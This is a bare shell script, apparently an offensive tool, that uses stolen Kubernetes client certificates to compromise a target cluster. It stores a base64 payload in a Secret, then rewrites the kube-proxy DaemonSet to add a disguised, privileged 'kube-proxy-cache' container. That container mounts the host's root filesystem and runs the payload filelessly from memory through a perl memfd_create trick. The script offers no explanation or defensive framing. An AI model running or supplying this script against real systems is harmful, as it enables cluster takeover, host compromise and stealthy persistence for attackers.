target_ip=

volume_name=cache

mount_path=/var/kube-proxy-cache

ctr_name=kube-proxy-cache

binary_file=/usr/local/bin/kube-proxy-cache

payload_name=cache

secret_name=proxy-cache

secret_data_name=content

ctr_line_num=$(kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key -n kube-system get daemonsets kube-proxy -o yaml | awk '/ containers:/{print NR}')

volume_line_num=$(kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key -n kube-system get daemonsets kube-proxy -o yaml | awk '/ volumes:/{print NR}')

image=$(kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key -n kube-system get daemonsets kube-proxy -o yaml | grep " image:" | awk '{print $2}')

# create payload secret
cat << EOF | kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: $secret_name
  namespace: kube-system
type: Opaque
data:
  $secret_data_name: PAYLOAD_VALUE_BASE64
EOF

# assume that ctr_line_num < volume_line_num
# otherwise you should switch the two sed commands below

# inject malicious container into kube-proxy pod
kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key -n kube-system get daemonsets kube-proxy -o yaml \
  | sed "$volume_line_num a\ \ \ \ \ \ - name: $volume_name\n        hostPath:\n          path: /\n          type: Directory\n" \
  | sed "$ctr_line_num a\ \ \ \ \ \ - name: $ctr_name\n        image: $image\n        imagePullPolicy: IfNotPresent\n        command: [\"sh\"]\n        args: [\"-c\", \"echo \$$payload_name | perl -e 'my \$n=qq(); my \$fd=syscall(319, \$n, 1); open(\$FH, qq(>&=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, <STDIN>; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}'\"]\n        env:\n          - name: $payload_name\n            valueFrom:\n              secretKeyRef:\n                name: $secret_name\n                key: $secret_data_name\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: $mount_path\n          name: $volume_name" \
  | kubectl --server=https://$target_ip:6443 --certificate-authority=./ca.crt --client-certificate=./apiserver-kubelet-client.crt --client-key=./apiserver-kubelet-client.key replace -f -


